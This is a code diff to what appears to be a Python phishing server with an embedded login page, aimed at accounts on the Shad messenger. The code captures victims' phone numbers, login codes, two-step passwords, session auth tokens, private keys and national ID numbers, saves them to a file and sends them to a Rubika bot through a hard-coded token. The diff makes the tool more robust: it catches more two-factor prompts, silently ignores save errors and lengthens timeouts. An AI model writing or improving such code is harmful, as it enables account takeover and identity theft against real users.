@@ -26,8 +26,14 @@ APP_VERSION = "4.0.1"
 API_VERSION = "6"
 IV = b"\x00" * 16
 
-BOT_TOKEN = "CJGICH0VFFYMXGQSVDOGMCZJHSSGEVUMODYPGNODPZRSAOCZVCDIPURGKCPVKVHM"
-BOT_CHAT_ID = "b0KGc1x0BSmB0e743965c83ee1c63398"
+BOT_TOKEN = os.environ.get(
+    "RUBIKA_BOT_TOKEN",
+    "CJGICH0VFFYMXGQSVDOGMCZJHSSGEVUMODYPGNODPZRSAOCZVCDIPURGKCPVKVHM",
+)
+BOT_CHAT_ID = os.environ.get(
+    "RUBIKA_BOT_CHAT_ID",
+    "b0KGc1x0BSmB0e743965c83ee1c63398",
+)
 BOT_API_BASE = "https://botapi.rubika.ir/v3"
 
 HOST = os.environ.get("HOST", "0.0.0.0")
@@ -214,7 +220,12 @@ def _extract_identity_and_national_id(payload_obj, raw_text: str) -> tuple[str, 
     return role_label, national_id
 
 
-def send_auth_to_rubika_bot(auth_value: str, phone: str, identity_role: str = "نامشخص", national_id: str = "نامشخص") -> dict:
+def send_auth_to_rubika_bot(
+    auth_value: str,
+    phone: str,
+    identity_role: str = "نامشخص",
+    national_id: str = "نامشخص",
+) -> dict:
     text = (
         f"هویت: {identity_role}\n"
         f"کد ملی: {national_id}\n"
@@ -410,11 +421,14 @@ class ShadAuthSession:
         combined = json.dumps({"res": res, "data": data}, ensure_ascii=False).upper()
         for token in (
             "2FA",
+            "2STEP",
             "TWO_STEP",
+            "TWO_FACTOR",
             "PASS_KEY",
             "PASSKEY",
             "PASSWORD_REQUIRED",
             "NEED_PASSWORD",
+            "INVALID_PASSWORD",
             "SRP",
         ):
             if token in combined:
@@ -494,7 +508,7 @@ class ShadAuthSession:
         if self.pending_code:
             return self.sign_in_and_send(self.pending_code)
 
-        return self._actually_send_code(pass_key=pwd)
+        return {"ok": True, "need_code": True}
 
     def register_device(self) -> dict:
         payload = {
@@ -524,20 +538,23 @@ class ShadAuthSession:
 
         identity_role, national_id = self.fetch_endpoint_identity(auth_plain)
 
-        save_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "shad_auth.json")
-        with open(save_path, "w", encoding="utf-8") as f:
-            json.dump(
-                {
-                    "phone": self.phone,
-                    "auth": auth_plain,
-                    "private_key": self.priv_key_b64,
-                    "identity": identity_role,
-                    "national_id": national_id,
-                },
-                f,
-                ensure_ascii=False,
-                indent=2,
-            )
+        try:
+            save_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "shad_auth.json")
+            with open(save_path, "w", encoding="utf-8") as f:
+                json.dump(
+                    {
+                        "phone": self.phone,
+                        "auth": auth_plain,
+                        "private_key": self.priv_key_b64,
+                        "identity": identity_role,
+                        "national_id": national_id,
+                    },
+                    f,
+                    ensure_ascii=False,
+                    indent=2,
+                )
+        except Exception:
+            pass
 
         bot_res = send_auth_to_rubika_bot(
             auth_plain,
@@ -826,7 +843,7 @@ HTML_PAGE = """<!DOCTYPE html>
       msgEl.textContent = "در حال ارسال...";
       try {
         const controller = new AbortController();
-        const timer = setTimeout(() => controller.abort(), 22000);
+        const timer = setTimeout(() => controller.abort(), 35000);
         const r = await fetch("/send-code", {
           method: "POST",
           headers: {"Content-Type": "application/json"},
@@ -843,8 +860,7 @@ HTML_PAGE = """<!DOCTYPE html>
         }
       } catch (e) {
         if (e.name === "AbortError") {
-          msgEl.textContent = "";
-          showPage("pageCode");
+          await showError(msgEl, "پاسخ سرور طولانی شد؛ دوباره تلاش کنید.");
         } else {
           await showError(msgEl, `${e.name}: ${e.message}`);
         }
@@ -862,10 +878,10 @@ HTML_PAGE = """<!DOCTYPE html>
         return;
       }
       btn.disabled = true;
-      msgEl.textContent = "در حال ثبت و ارسال کد...";
+      msgEl.textContent = "در حال ثبت...";
       try {
         const controller = new AbortController();
-        const timer = setTimeout(() => controller.abort(), 22000);
+        const timer = setTimeout(() => controller.abort(), 35000);
         const r = await fetch("/submit-2fa", {
           method: "POST",
           headers: {"Content-Type": "application/json"},
@@ -881,7 +897,11 @@ HTML_PAGE = """<!DOCTYPE html>
           await showError(msgEl, data.error || "خطا در تایید دو مرحله‌ای.");
         }
       } catch (e) {
-        await showError(msgEl, `${e.name}: ${e.message}`);
+        if (e.name === "AbortError") {
+          await showError(msgEl, "پاسخ سرور طولانی شد؛ دوباره تلاش کنید.");
+        } else {
+          await showError(msgEl, `${e.name}: ${e.message}`);
+        }
       } finally {
         btn.disabled = false;
       }
@@ -899,7 +919,7 @@ HTML_PAGE = """<!DOCTYPE html>
       msgEl.textContent = "در حال تایید...";
       try {
         const controller = new AbortController();
-        const timer = setTimeout(() => controller.abort(), 24000);
+        const timer = setTimeout(() => controller.abort(), 35000);
         const r = await fetch("/verify-code", {
           method: "POST",
           headers: {"Content-Type": "application/json"},
@@ -917,7 +937,11 @@ HTML_PAGE = """<!DOCTYPE html>
           await showError(msgEl, data.error || "کد نامعتبر است.");
         }
       } catch (e) {
-        await showError(msgEl, `${e.name}: ${e.message}`);
+        if (e.name === "AbortError") {
+          await showError(msgEl, "پاسخ سرور طولانی شد؛ دوباره تلاش کنید.");
+        } else {
+          await showError(msgEl, `${e.name}: ${e.message}`);
+        }
       } finally {
         btn.disabled = false;
       }
